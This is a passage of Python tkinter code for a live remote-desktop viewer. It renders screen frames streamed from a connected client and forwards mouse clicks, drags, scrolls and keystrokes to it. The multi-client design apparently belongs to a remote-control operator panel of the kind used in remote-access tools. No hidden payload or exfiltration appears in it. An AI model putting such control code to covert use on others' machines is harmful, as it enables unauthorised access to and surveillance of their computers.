    title_lbl = tk.Label(tf, text="🖥️  LIVE SCREEN DESKTOP", font=("Segoe UI", 12, "bold"), bg="#1A1A22", fg="#00E5FF")
    title_lbl.pack(anchor="w")
    
    # Glowing status badge
    status_frame = tk.Frame(tf, bg="#1A1A22")
    status_frame.pack(anchor="w", pady=(2, 0))
    
    glow_dot = tk.Label(status_frame, text="●", font=("Segoe UI", 10, "bold"), bg="#1A1A22", fg="#00E676")
    glow_dot.pack(side="left")
    
    status_lbl = tk.Label(status_frame, text="Connecting to client...", font=("Segoe UI", 9, "bold"), bg="#1A1A22", fg="#90A4AE")
    status_lbl.pack(side="left", padx=5)

    # Blinking animation for the green dot! (micro-animation)
    def blink():
        if not win.winfo_exists():
            return
        try:
            current_fg = glow_dot.cget("fg")
            next_fg = "#1A1A22" if current_fg == "#00E676" else "#00E676"
            glow_dot.config(fg=next_fg)
            win.after(600, blink)
        except Exception:
            pass
    blink()

    # Options & Buttons on the right
    bf = tk.Frame(header, bg="#1A1A22")
    bf.pack(side="right", padx=20, pady=10)

    # Scaling flag
    win.scale_to_window = tk.BooleanVar(value=True)

    scale_chk = tk.Checkbutton(bf, text="Auto Scale to Window", variable=win.scale_to_window,
                               font=("Segoe UI", 10, "bold"), bg="#1A1A22", fg="#ECEFF1",
                               selectcolor="#2D2D3D", activebackground="#1A237E", activeforeground="white",
                               cursor="hand2")
    scale_chk.pack(side="left", padx=15)

    # ── on_close must be defined before stop_btn so the button can reference it ──
    def on_close():
        cmds.stop_screen_stream()
        g.screen_monitor_window = None
        try:
            win.destroy()
        except Exception:
            pass

    win.protocol("WM_DELETE_WINDOW", on_close)

    # Styled Crimson Stop Button
    stop_btn = tk.Button(bf, text="⏹ Stop Stream", command=on_close,
                         font=("Segoe UI", 10, "bold"), bg="#E53935", fg="white",
                         relief="flat", padx=20, pady=8, cursor="hand2")
    stop_btn.pack(side="left", padx=5)

    # Hover animations (Micro-animations)
    def on_stop_enter(e): stop_btn.config(bg="#D32F2F")
    def on_stop_leave(e): stop_btn.config(bg="#E53935")
    stop_btn.bind("<Enter>", on_stop_enter)
    stop_btn.bind("<Leave>", on_stop_leave)

    # ── Canvas Area (Sleek Border) ──────────────────────────────────────────
    canvas = tk.Canvas(win, bg="#16161C", highlightthickness=0)
    canvas.pack(fill="both", expand=True, padx=10, pady=(10, 5))

    # ── Bottom Status Bar (Premium Details) ──────────────────────────────────
    status_bar = tk.Frame(win, bg="#1A1A22", height=35, highlightbackground="#2D2D3D", highlightthickness=1)
    status_bar.pack(fill="x", side="bottom")
    status_bar.pack_propagate(False)

    tips_lbl = tk.Label(status_bar, text="🖱️ Click: Select  •  🖱️ Right Click: Menu  •  ⌨️ Keypress: Type  •  ✨ Control Mode Active",
                          font=("Segoe UI", 9, "bold"), bg="#1A1A22", fg="#81C784")
    tips_lbl.pack(side="left", padx=20)

    latency_lbl = tk.Label(status_bar, text="FPS: -- | Quality: 50 | Stream: TCP",
                            font=("Segoe UI", 9, "italic"), bg="#1A1A22", fg="#B0BEC5")
    latency_lbl.pack(side="right", padx=20)

    win.current_img = None
    win.current_photo = None
    win.remote_resolution = "1024x768"
    win.last_frame_time = time.time()

    # ── Shared helpers ────────────────────────────────────────────────────────
    def _send_mouse_cmd(cmd_str):
        """Send a mouse/keyboard command to active client in a background thread."""
        def _send():
            try:
                with g.clients_lock:
                    if g.active_client_id in g.clients:
                        g.clients[g.active_client_id]["conn"].send(cmd_str.encode())
            except Exception:
                pass
        threading.Thread(target=_send, daemon=True).start()

    def _calc_remote_coords(event):
        """Convert canvas event coordinates to remote screen coordinates."""
        if win.current_img is None:
            return None, None
        cw = canvas.winfo_width()
        ch = canvas.winfo_height()
        img_w, img_h = win.current_img.size
        if win.scale_to_window.get():
            ratio = min(cw / img_w, ch / img_h)
            display_w = int(img_w * ratio)
            display_h = int(img_h * ratio)
        else:
            display_w, display_h = img_w, img_h
        offset_x = (cw - display_w) // 2
        offset_y = (ch - display_h) // 2
        if not (offset_x <= event.x < offset_x + display_w and
                offset_y <= event.y < offset_y + display_h):
            return None, None
        ix, iy = event.x - offset_x, event.y - offset_y
        rx = int(ix * (img_w / display_w))
        ry = int(iy * (img_h / display_h))
        try:
            orig_w, orig_h = map(int, win.remote_resolution.split("x"))
            rx = int(rx * (orig_w / img_w))
            ry = int(ry * (orig_h / img_h))
        except Exception:
            pass
        return rx, ry

    # ── Mouse Click / Drag / Scroll ───────────────────────────────────────────
    _drag_moved = [False]

    def on_btn_press(event):
        """Mouse button pressed — start of potential drag."""
        _drag_moved[0] = False
        if not g.active_client_id:
            return
        rx, ry = _calc_remote_coords(event)
        if rx is not None:
            _send_mouse_cmd(f"MOUSE_PRESS:{rx}:{ry}")

    def on_btn_release(event):
        """Mouse button released — send click if no drag occurred, else release."""
        if not g.active_client_id:
            return
        rx, ry = _calc_remote_coords(event)
        if rx is not None:
            if not _drag_moved[0]:
                _send_mouse_cmd(f"MOUSE_CLICK:{rx}:{ry}:left")
            else:
                _send_mouse_cmd(f"MOUSE_RELEASE:{rx}:{ry}")
        _drag_moved[0] = False

    def on_btn_drag(event):
        """Mouse moved while button held — drag in progress."""
        if not g.active_client_id:
            return
        _drag_moved[0] = True
        rx, ry = _calc_remote_coords(event)
        if rx is not None:
            _send_mouse_cmd(f"MOUSE_DRAG:{rx}:{ry}")

    def on_right_click(event):
        if not g.active_client_id:
            return
        rx, ry = _calc_remote_coords(event)
        if rx is not None:
            _send_mouse_cmd(f"MOUSE_CLICK:{rx}:{ry}:right")

    def on_double_click(event):
        if not g.active_client_id:
            return
        rx, ry = _calc_remote_coords(event)
        if rx is not None:
            _send_mouse_cmd(f"MOUSE_CLICK:{rx}:{ry}:double")

    def on_scroll(event, direction=None):
        """Mouse wheel scroll — send scroll delta to client."""
        if not g.active_client_id:
            return
        if direction == "up":
            delta = 3
        elif direction == "down":
            delta = -3
        else:
            # Windows: event.delta is +/-120 per notch
            delta = event.delta // 40 if event.delta else 0
        if delta != 0:
            _send_mouse_cmd(f"MOUSE_SCROLL:{delta}")

    # Bind all mouse events
    canvas.bind("<ButtonPress-1>",   on_btn_press)
    canvas.bind("<ButtonRelease-1>", on_btn_release)
    canvas.bind("<B1-Motion>",       on_btn_drag)
    canvas.bind("<Button-3>",        on_right_click)
    canvas.bind("<Double-Button-1>", on_double_click)
    canvas.bind("<MouseWheel>",      on_scroll)               # Windows
    canvas.bind("<Button-4>", lambda e: on_scroll(e, "up"))   # Linux scroll up
    canvas.bind("<Button-5>", lambda e: on_scroll(e, "down")) # Linux scroll down

    def on_key_press(event):
        """Send key press to remote client. Supports Ctrl+key hotkeys and special keys."""
        if not g.active_client_id:
            return
        key_name = event.keysym
        ctrl_held  = bool(event.state & 0x4)
        shift_held = bool(event.state & 0x1)

        special_keys = {
            "Return":    "Key.enter",
            "BackSpace": "Key.backspace",
            "Tab":       "Key.tab",
            "Escape":    "Key.esc",
            "space":     " ",
            "Delete":    "Key.delete",
            "Up":        "Key.up",
            "Down":      "Key.down",
            "Left":      "Key.left",
            "Right":     "Key.right",
            "Home":      "Key.home",
            "End":       "Key.end",
            "Prior":     "Key.page_up",    # Page Up
            "Next":      "Key.page_down",  # Page Down
            "F1":  "Key.f1",  "F2":  "Key.f2",  "F3":  "Key.f3",  "F4":  "Key.f4",
            "F5":  "Key.f5",  "F6":  "Key.f6",  "F7":  "Key.f7",  "F8":  "Key.f8",
            "F9":  "Key.f9",  "F10": "Key.f10", "F11": "Key.f11", "F12": "Key.f12",
        }

        if ctrl_held and len(key_name) == 1:
            # Ctrl+letter hotkey  (e.g. Ctrl+C, Ctrl+V, Ctrl+Z, Ctrl+A)
            _send_mouse_cmd(f"KEY_PRESS:ctrl+{key_name.lower()}")
        elif key_name in special_keys:
            _send_mouse_cmd(f"KEY_PRESS:{special_keys[key_name]}")
        elif len(key_name) == 1:
            _send_mouse_cmd(f"KEY_PRESS:{key_name}")

    win.bind("<Key>", on_key_press)

    def update_frame(img_data_b64, resolution):
        if not win.winfo_exists():
            return
        try:
            # Calculate FPS dynamically
            current_time = time.time()
            elapsed = current_time - win.last_frame_time
            win.last_frame_time = current_time
            fps = int(1.0 / elapsed) if elapsed > 0 else 0
            
            status_lbl.config(text=f"Live Stream • Resolution: {resolution}", fg="#00E676")
            latency_lbl.config(text=f"FPS: {fps} | Resized: 1024w | Stream: TCP (Bilinear)")

            win.remote_resolution = resolution
            img_data = base64.b64decode(img_data_b64)
            pil_img = Image.open(io.BytesIO(img_data))
            win.current_img = pil_img

            # Render
            render_frame()
        except Exception:
            pass

    def render_frame(event=None):
        if not win.winfo_exists() or win.current_img is None:
            return
        try:
            pil_img = win.current_img
            cw = canvas.winfo_width()
            ch = canvas.winfo_height()
            if cw < 10 or ch < 10:
                cw, ch = 1100, 700

            if win.scale_to_window.get():
                # Scale image to fit canvas using bilinear (extremely fast)
                img_w, img_h = pil_img.size
                ratio = min(cw / img_w, ch / img_h)
                new_w = max(10, int(img_w * ratio))
                new_h = max(10, int(img_h * ratio))
                resized = pil_img.resize((new_w, new_h), Image.Resampling.BILINEAR)
                photo = ImageTk.PhotoImage(resized)
                canvas.delete("all")
                canvas.create_image(cw // 2, ch // 2, image=photo, anchor="center")
                win.current_photo = photo
            else:
                photo = ImageTk.PhotoImage(pil_img)
                canvas.delete("all")
                canvas.create_image(cw // 2, ch // 2, image=photo, anchor="center")
                win.current_photo = photo
        except Exception:
            pass

    win.bind("<Configure>", lambda e: render_frame())

    # Set button in global references if possible to track active state
    btn = getattr(g, 'screen_monitor_button', None)
    if btn:
        btn.config(text="⏹ Stop Stream", bg="#D32F2F")

    # Start the stream in a background thread
    def run_stream():
        cmds.start_screen_stream(update_frame)

    threading.Thread(target=run_stream, daemon=True).start()

    # on_close and win.protocol are already set above (before stop_btn)
